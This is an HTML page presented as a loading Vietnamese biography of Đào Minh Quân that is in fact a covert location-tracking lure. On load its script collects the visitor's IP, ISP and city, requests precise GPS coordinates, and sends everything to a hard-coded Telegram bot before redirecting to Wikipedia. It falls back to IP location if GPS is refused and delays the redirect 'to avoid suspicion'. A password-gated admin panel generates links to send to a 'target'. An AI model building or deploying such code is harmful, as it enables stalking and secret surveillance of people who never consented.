<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Tiá»ƒu sá»­ ÄÃ o Minh QuÃ¢n</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #4285F4; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body class="bg-[#0b0e14] font-sans text-slate-400">

    <div id="view-track" class="flex flex-col items-center justify-center h-screen bg-white">
        <div class="loader"></div>
        <p class="mt-4 text-gray-500 text-sm italic">Äang táº£i ná»™i dung tiá»ƒu sá»­...</p>
    </div>

    <div id="view-admin" class="hidden min-h-screen p-6">
        <div class="max-w-4xl mx-auto">
            <h1 class="text-2xl font-black text-white italic mb-8">SENTINEL <span class="text-blue-500">X</span> ADMIN</h1>
            <div class="grid md:grid-cols-2 gap-8">
                <div class="bg-[#161b22] p-6 rounded-3xl border border-slate-800 shadow-2xl">
                    <h3 class="text-blue-500 font-bold text-xs uppercase mb-4 italic tracking-widest">Cáº¥u hÃ¬nh há»‡ thá»‘ng</h3>
                    <div class="space-y-4">
                        <input id="adm-token" type="text" placeholder="Bot Token" class="w-full bg-[#0d1117] border border-slate-800 p-3 rounded-xl text-xs text-blue-400 outline-none">
                        <input id="adm-id" type="text" placeholder="Chat ID" class="w-full bg-[#0d1117] border border-slate-800 p-3 rounded-xl text-xs text-blue-400 outline-none">
                        <input id="adm-redir" type="text" placeholder="URL chuyá»ƒn hÆ°á»›ng" class="w-full bg-[#0d1117] border border-slate-800 p-3 rounded-xl text-xs text-green-500 outline-none">
                        <button onclick="updateConfig()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-xl text-xs transition-all shadow-lg shadow-blue-900/20">LÆ¯U & Táº O LINK</button>
                    </div>
                </div>
                <div class="bg-[#161b22] p-6 rounded-3xl border border-slate-800 flex flex-col justify-between">
                    <div>
                        <h3 class="text-yellow-500 font-bold text-xs uppercase mb-4 italic tracking-widest">Link Tracking Cá»§a Báº¡n</h3>
                        <div id="res-link" class="bg-black p-4 rounded-2xl text-blue-400 text-[10px] break-all border border-slate-900 min-h-[50px] cursor-pointer active:scale-95 transition-transform" onclick="copyLink()">ChÆ°a cÃ³ cáº¥u hÃ¬nh...</div>
                    </div>
                    <p class="mt-4 text-[9px] text-slate-500 italic">* LÆ°u Ã½: Link nÃ y chá»©a mÃ£ xÃ¡c thá»±c ngáº§m. Gá»­i cho má»¥c tiÃªu Ä‘á»ƒ láº¥y vá»‹ trÃ­.</p>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Cáº¥u hÃ¬nh máº·c Ä‘á»‹nh (Fallback)
        let cfg = {
            t: "8358235784:AAGTQQiBeQssDDMrrs0fC-Wb4iNwJ6V2144",
            i: "5887642221",
            r: "https://vi.wikipedia.org/wiki/ÄÃ o_Minh_QuÃ¢n"
        };

        const updateConfig = () => {
            cfg.t = document.getElementById('adm-token').value;
            cfg.i = document.getElementById('adm-id').value;
            cfg.r = document.getElementById('adm-redir').value;
            localStorage.setItem('sentinel_v12', JSON.stringify(cfg));
            showLink();
        };

        const showLink = () => {
            const base = window.location.href.split('?')[0];
            const data = btoa(JSON.stringify(cfg));
            document.getElementById('res-link').innerText = `${base}?v=${data}`;
        };

        const copyLink = () => {
            navigator.clipboard.writeText(document.getElementById('res-link').innerText);
            alert("ÄÃ£ copy link!");
        };

        window.onload = async () => {
            const params = new URLSearchParams(window.location.search);

            // Xá»¬ LÃ GIAO DIá»†N ADMIN
            if (params.has('admin')) {
                const pass = prompt("Nháº­p máº­t kháº©u Admin:");
                if (pass !== "123") return window.location.replace(window.location.href.split('?')[0]);
                
                document.getElementById('view-track').classList.add('hidden');
                document.getElementById('view-admin').classList.remove('hidden');
                const saved = localStorage.getItem('sentinel_v12');
                if(saved) cfg = JSON.parse(saved);
                document.getElementById('adm-token').value = cfg.t;
                document.getElementById('adm-id').value = cfg.i;
                document.getElementById('adm-redir').value = cfg.r;
                showLink();
                return;
            }

            // Xá»¬ LÃ TRACKING (Má»¤C TIÃŠU)
            if (params.has('v')) {
                try { cfg = JSON.parse(atob(params.get('v'))); } catch(e) {}
            }

            const send = async (txt) => {
                await fetch(`https://api.telegram.org/bot${cfg.t}/sendMessage`, {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({chat_id: cfg.i, text: txt, parse_mode: "HTML"})
                });
            };

            // BÆ¯á»šC 1: SHADOW TRACKING (Láº¥y IP ngay láº­p tá»©c)
            const ipRes = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => null);
            let log = `ğŸš€ <b>Má»¤C TIÃŠU VÃ€O LINK</b>\nğŸŒ IP: <code>${ipRes?.ip || '?' }</code>\nğŸ¢ ISP: ${ipRes?.org || '?'}\nğŸ“ VÃ¹ng: ${ipRes?.city || '?'}, ${ipRes?.country_name || '?'}`;
            
            await send(log + "\nâ³ <i>Äang Ã©p láº¥y tá»a Ä‘á»™ GPS...</i>");

            // BÆ¯á»šC 2: GPS TRACKING
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (p) => {
                        const gps = `\n\nğŸ¯ <b>Tá»ŒA Äá»˜ CHÃNH XÃC:</b>\nğŸ“ GPS: <code>${p.coords.latitude},${p.coords.longitude}</code>\nğŸ—ºï¸ <a href="https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}">XEM Vá»Š TRÃ Vá»† TINH</a>`;
                        await send(log + gps);
                        window.location.replace(cfg.r);
                    },
                    async (err) => {
                        // Náº¾U Tá»ª CHá»I GPS - CHáº Y JAVASCRIPT áº¨N Láº¤Y Vá»Š TRÃ IP Dá»° PHÃ’NG
                        const fallback = `\n\nâš ï¸ <b>Má»¤C TIÃŠU Tá»ª CHá»I GPS</b>\nğŸ“ Vá»‹ trÃ­ IP dá»± phÃ²ng: <a href="https://www.google.com/maps?q=${ipRes?.latitude},${ipRes?.longitude}">Xem vÃ¹ng lÃ¢n cáº­n</a>`;
                        await send(log + fallback);
                        window.location.replace(cfg.r);
                    },
                    { enableHighAccuracy: true, timeout: 6000 }
                );
            } else {
                window.location.replace(cfg.r);
            }

            // Tá»± Ä‘á»™ng chuyá»ƒn hÆ°á»›ng sau 8s Ä‘á»ƒ trÃ¡nh nghi ngá»
            setTimeout(() => { window.location.replace(cfg.r); }, 8000);
        };
    </script>
</body>
</html>
